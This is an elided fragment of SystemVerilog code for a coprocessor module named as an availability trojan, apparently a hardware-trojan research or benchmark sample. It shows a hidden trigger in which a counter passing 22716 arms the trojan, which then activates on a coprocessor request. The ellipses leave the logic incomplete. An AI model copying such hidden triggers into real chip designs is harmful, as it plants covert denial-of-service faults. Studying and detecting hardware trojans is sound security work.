...
// Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22716;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|register_valid) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && cvxif_req_t) trojan_active <= 1'b1;
        end
    end
...
module cvxif_example_coprocessor_trojan_Availability
